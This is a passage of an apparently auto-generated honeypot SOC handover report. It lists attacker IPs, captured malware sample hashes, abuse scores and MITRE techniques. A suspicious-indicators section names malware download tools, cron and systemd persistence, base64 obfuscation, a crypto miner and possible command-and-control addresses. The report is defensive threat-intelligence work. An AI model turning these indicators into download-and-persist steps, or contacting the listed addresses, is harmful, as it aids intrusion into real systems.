| `146.168.191[.]176` | 1 | 2026-11-18 06:26 | 2026-11-18 06:27 | 10s | 0 | `T1592` | 🟢 LOW |
| `146.196.40[.]251` | 1 | 2026-11-18 14:42 | 2026-11-18 14:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `146.196.81[.]148` | 1 | 2026-11-18 17:31 | 2026-11-18 17:31 | 6s | 1 | `T1110.001` | 🟢 LOW |
| `147.125.241[.]19` | 1 | 2026-11-18 11:50 | 2026-11-18 11:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `165.22.105[.]175` | 1 | 2026-11-18 15:33 | 2026-11-18 15:34 | 16s | 0 | `T1592` | 🟢 LOW |
| `169.212.149[.]252` | 1 | 2026-11-18 17:00 | 2026-11-18 17:00 | 17s | 0 | `T1592` | 🟢 LOW |
| `170.64.147[.]115` | 1 | 2026-11-18 18:34 | 2026-11-18 18:34 | 30s | 0 | `T1592` | 🟢 LOW |
| `172.212.203[.]117` | 1 | 2026-11-18 17:52 | 2026-11-18 17:53 | 9s | 0 | `T1592` | 🟢 LOW |
| `172.239.71[.]239` | 1 | 2026-11-18 16:37 | 2026-11-18 16:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `178.17.240[.]71` | 1 | 2026-11-18 06:58 | 2026-11-18 06:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | 1 | 2026-11-18 16:47 | 2026-11-18 16:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | 1 | 2026-11-18 05:31 | 2026-11-18 05:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | 1 | 2026-11-18 07:46 | 2026-11-18 07:46 | 9s | 0 | `T1592` | 🟢 LOW |
| `181.16.140[.]222` | 1 | 2026-11-18 08:15 | 2026-11-18 08:15 | 14s | 0 | `T1592` | 🟢 LOW |
| `184.105.247[.]196` | 1 | 2026-11-18 12:00 | 2026-11-18 12:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.242.226[.]17` | 1 | 2026-11-18 15:22 | 2026-11-18 15:22 | 10s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]11` | 1 | 2026-11-18 12:11 | 2026-11-18 12:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `186.226.189[.]64` | 1 | 2026-11-18 06:31 | 2026-11-18 06:31 | 12s | 0 | `T1592` | 🟢 LOW |
| `190.115.80[.]35` | 1 | 2026-11-18 17:37 | 2026-11-18 17:37 | 11s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-18 07:40 | 2026-11-18 07:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-18 14:37 | 2026-11-18 14:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.187.179[.]130` | 1 | 2026-11-18 07:42 | 2026-11-18 07:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.80.141[.]236` | 1 | 2026-11-18 10:55 | 2026-11-18 10:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.14.76[.]5` | 1 | 2026-11-18 18:15 | 2026-11-18 18:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.63.168[.]90` | 1 | 2026-11-18 12:20 | 2026-11-18 12:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `208.53.97[.]144` | 1 | 2026-11-18 05:21 | 2026-11-18 05:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `209.14.28[.]47` | 1 | 2026-11-18 09:04 | 2026-11-18 09:05 | 32s | 0 | `T1592` | 🟢 LOW |
| `211.185.81[.]26` | 1 | 2026-11-18 05:13 | 2026-11-18 05:13 | 24s | 0 | `T1592` | 🟢 LOW |
| `211.220.156[.]232` | 1 | 2026-11-18 08:12 | 2026-11-18 08:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `217.60.77[.]75` | 1 | 2026-11-18 18:10 | 2026-11-18 18:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `218.13.214[.]18` | 1 | 2026-11-18 06:42 | 2026-11-18 06:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `219.153.103[.]109` | 1 | 2026-11-18 15:50 | 2026-11-18 15:50 | 1s | 0 | `T1592` | 🟢 LOW |
| `223.83.183[.]254` | 1 | 2026-11-18 08:27 | 2026-11-18 08:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `23.132.164[.]185` | 1 | 2026-11-18 17:35 | 2026-11-18 17:35 | 1s | 0 | `T1592` | 🟢 LOW |
| `36.163.227[.]186` | 1 | 2026-11-18 05:02 | 2026-11-18 05:02 | 12s | 0 | `T1592` | 🟢 LOW |
| `36.255.97[.]232` | 1 | 2026-11-18 15:31 | 2026-11-18 15:31 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `40.119.43[.]103` | 1 | 2026-11-18 07:17 | 2026-11-18 07:17 | 9s | 0 | `T1592` | 🟢 LOW |
| `43.99.105[.]5` | 1 | 2026-11-18 11:40 | 2026-11-18 11:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-11-18 10:07 | 2026-11-18 10:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.229.38[.]98` | 1 | 2026-11-18 14:05 | 2026-11-18 14:05 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.64.134[.]75` | 1 | 2026-11-18 14:15 | 2026-11-18 14:15 | 4s | 0 | `T1592` | 🟢 LOW |
| `45.77.61[.]56` | 1 | 2026-11-18 05:30 | 2026-11-18 05:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.151.178[.]14` | 1 | 2026-11-18 15:16 | 2026-11-18 15:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.98.62[.]157` | 1 | 2026-11-18 15:53 | 2026-11-18 15:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.251.121[.]150` | 1 | 2026-11-18 16:13 | 2026-11-18 16:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.254.215[.]62` | 1 | 2026-11-18 08:17 | 2026-11-18 08:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.115.217[.]143` | 1 | 2026-11-18 07:44 | 2026-11-18 07:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | 1 | 2026-11-18 13:13 | 2026-11-18 13:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.209.82[.]184` | 1 | 2026-11-18 08:23 | 2026-11-18 08:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `58.244.15[.]186` | 1 | 2026-11-18 08:42 | 2026-11-18 08:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `62.108.202[.]22` | 1 | 2026-11-18 13:08 | 2026-11-18 13:09 | 7s | 0 | `T1592` | 🟢 LOW |
| `62.210.198[.]27` | 1 | 2026-11-18 10:59 | 2026-11-18 10:59 | 32s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]219` | 1 | 2026-11-18 13:02 | 2026-11-18 13:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]167` | 1 | 2026-11-18 07:39 | 2026-11-18 07:40 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-11-18 07:28 | 2026-11-18 07:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]94` | 1 | 2026-11-18 09:38 | 2026-11-18 09:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]122` | 1 | 2026-11-18 06:41 | 2026-11-18 06:41 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]31` | 1 | 2026-11-18 08:36 | 2026-11-18 08:36 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.159[.]97` | 1 | 2026-11-18 15:53 | 2026-11-18 15:53 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]135` | 1 | 2026-11-18 08:32 | 2026-11-18 08:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]193` | 1 | 2026-11-18 06:42 | 2026-11-18 06:42 | 16s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]238` | 1 | 2026-11-18 06:41 | 2026-11-18 06:42 | 14s | 0 | `T1592` | 🟢 LOW |
| `71.6.199[.]23` | 1 | 2026-11-18 18:39 | 2026-11-18 18:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]105` | 1 | 2026-11-18 16:05 | 2026-11-18 16:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-11-18 15:48 | 2026-11-18 15:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-18 08:40 | 2026-11-18 08:40 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-18 13:12 | 2026-11-18 13:12 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-18 17:44 | 2026-11-18 17:44 | 6s | 0 | `T1592` | 🟢 LOW |
| `79.108.228[.]122` | 1 | 2026-11-18 11:44 | 2026-11-18 11:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `8.130.162[.]16` | 1 | 2026-11-18 05:53 | 2026-11-18 05:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]234` | 1 | 2026-11-18 17:50 | 2026-11-18 17:50 | 9s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]55` | 1 | 2026-11-18 13:10 | 2026-11-18 13:10 | 9s | 0 | `T1592` | 🟢 LOW |
| `85.172.105[.]45` | 1 | 2026-11-18 12:05 | 2026-11-18 12:05 | 33s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]0` | 1 | 2026-11-18 11:22 | 2026-11-18 11:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]16` | 1 | 2026-11-18 06:18 | 2026-11-18 06:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `86.38.187[.]105` | 1 | 2026-11-18 17:45 | 2026-11-18 17:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `86.54.31[.]34` | 1 | 2026-11-18 08:37 | 2026-11-18 08:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.135.255[.]51` | 1 | 2026-11-18 10:22 | 2026-11-18 10:23 | 13s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]72` | 1 | 2026-11-18 12:31 | 2026-11-18 12:31 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0de787cffbec4dcc42e0ecd9491795c7dfe8fe4a955cb67a87544d5c36070982` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `187b67e5e2116293144f4009b1f224ed09eea924dd4ade00741a66792a63b45a` | ELF Binary (Linux executable) (x86-64 64-bit) | `187b67e5e2116293...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `19e78c00d07f011fcb708ffb12f8dd2fd0f1e57faaf21129b53c7f68ae611e60` | ELF Binary (Linux executable) (x86-64 64-bit) | `19e78c00d07f011f...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `211.185.81[.]26` | KR | Korea Telecom | **100** ⚠️ | 10 |
| `195.3.220[.]7` | PL | MEVSPACE sp. z o.o. | **100** ⚠️ | 50 |
| `23.132.164[.]185` | DE | 10GIG.HOST | **100** ⚠️ | 50 |
| `185.247.137[.]11` | GB | Driftnet Ltd | **100** ⚠️ | 50 |
| `219.153.103[.]109` | CN | CHINANET Chongqing  province network | **100** ⚠️ | 50 |
| `193.187.110[.]160` | FI | Cyberaegis Casa S.R.L. | **100** ⚠️ | 50 |
| `18.218.118[.]203` | US | Amazon Technologies Inc. | **100** ⚠️ | 50 |
| `209.14.28[.]47` | BR | WIX NET DO BRASIL LTDA | **100** ⚠️ | 22 |
| `129.121.99[.]2` | US | Oso Grande IP Services, LLC | **100** ⚠️ | 31 |
| `62.108.202[.]22` | SE | Arkaden Konsult AB | **100** ⚠️ | 37 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 209 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 183 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 37 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 33 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 19 |

---

## 🔕 False Positive Summary (60 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 12 |
| AbuseIPDB score 1 below threshold 25 | 5 |
| AbuseIPDB score 11 below threshold 25 | 2 |
| AbuseIPDB score 12 below threshold 25 | 4 |
| AbuseIPDB score 14 below threshold 25 | 2 |
| AbuseIPDB score 16 below threshold 25 | 4 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 3 |
| AbuseIPDB score 23 below threshold 25 | 4 |
| AbuseIPDB score 24 below threshold 25 | 4 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 18 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 341 cases |
| Tool 34  | Credential Extractor        | ✅ 2516 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 26 fingerprints |
| Tool 36  | Command Clustering          | ✅ 32 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 211 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 60 filtered (17.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 101 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 39 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 169 priority case(s) shown individually · 101 recon entry/entries in table (7 group(s) consolidating 18 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-18T19:45:02Z_
